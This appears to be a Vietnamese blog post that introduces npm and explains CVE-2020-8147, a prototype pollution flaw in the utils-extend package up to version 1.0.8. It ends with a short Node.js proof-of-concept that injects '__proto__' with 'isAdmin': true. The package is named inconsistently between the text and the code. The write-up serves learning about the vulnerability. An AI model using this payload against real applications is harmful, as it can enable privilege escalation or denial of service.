# Tìm hiểu về  CVE-2020-8147

## I. Tìm hiểu về NPM
### 1. NPM là gì ?
**NPM là gì?** – NMP là viết tắt của Node package manager là một công cụ tạo và quản lý các thư viện lập trình Javascript cho [Node.js](https://nodejs.org/). Trong cộng đồng Javascript, các lập trình viên chia sẻ hàng trăm nghìn các thư viện với các đoạn code đã thực hiện sẵn một chức năng nào đó. Nó giúp cho các dự án mới tránh phải viết lại các thành phần cơ bản, các thư viện lập trình hay thậm chí cả các [framework](https://topdev.vn/blog/framework-la-gi/).

![](https://i.imgur.com/THg7cCV.png)
### 2. Công dụng của NPM là gì

Với `npm` , công việc sẽ đơn giản đi rất nhiều, chúng giúp bạn thực hiện việc quản lý đơn giản hơn rất nhiều. Các thư viện đều có sẵn trên npm, bạn chạy một dòng lệnh để tải về và dễ dàng include chúng hơn.

Mỗi đoạn code này có thể phụ thuộc vào rất nhiều các mã nguồn mở khác, thật may mắn khi các công cụ quản lý thư viện ra đời, nếu không sẽ mất rất nhiều công sức trong việc quản lý các thư viện này.

Cộng đồng sử dụng `npm` rất lớn, hàng nghìn các thư viện được phát hành, hỗ trợ Javascript ES6, React, Express, Grunt, Duo… Hiện nay cũng đã xuất hiện thêm Yarn một công cụ tương tự `npm`, được Facebook phát triển với nhiều tính năng vượt trội có khả năng sẽ thay thế `npm`.

Nếu như bạn từng code Php thì sẽ biết [Composer](https://topdev.vn/blog/composer-la-gi/) là công cụ quản lý thư viện của nó, tương tự như NPM là công cụ quản lý thư viện Javascript.

![](https://i.imgur.com/GXaCiwp.png)

## II. CVE-2020-8147
Sự tiện dụng của các **module** đồng thời với sự lớn mạnh của **JS** khi có NodeJS kèm theo những nguy cơ đáng kể về an toàn vì tính chia sẻ cao, cộng đồng  đông đảo một khi có một lỗ hổng tồn tại thì nó sẽ ảnh hưởng diện rộng. CVE-2020-8147 là một Vul như vậy. 
### Mức độ Nguy hại : Cao

### Mô tả 
Lỗi trong xác thực đầu vào trong gói **npm** **[utils-extension](h)** phiên bản **1.0.8** trở về trước có thể cho phép tấn công ô nhiễm nguyên mẫu có thể dẫn đến thực thi mã từ xa hoặc tấn công từ chối dịch vụ DoS của các ứng dụng sử dụng utils-extension.

Nó cho phép kẻ tấn công sửa đổi **prototype** của một đối tượng . Về mức độ nghiêm trọng tùy thuộc vào việc triển khai (DoS, access to sensitive data, RCE).

### Demo
- Để thực hiện demo hãy đảm bảo máy tính đã cài sẵn NodeJs.
- Clone repo này để demo với module utils-extension 1.0.8
![](https://i.imgur.com/VKJFXyu.png)
- Thực thi file Demo.js. 

> `$ node Demo.js`

    const {extend} = require('utils-extend');
    const payload = '{"__proto__":{"isAdmin":true}}'
    const emptyObject = {}
    const pollutionObject = JSON.parse(payload);
    extend({}, pollutionObject)
    console.log(emptyObject.isAdmin)  // true 


### Tham khảo

[https://hackerone.com/reports/801522](https://hackerone.com/reports/801522)
 [Information](https://www.tenable.com/cve/CVE-2020-8147#)
[CPEs (1)](https://www.tenable.com/cve/CVE-2020-8147#)
[Plugins (0)](https://www.tenable.com/cve/CVE-2020-8147#)

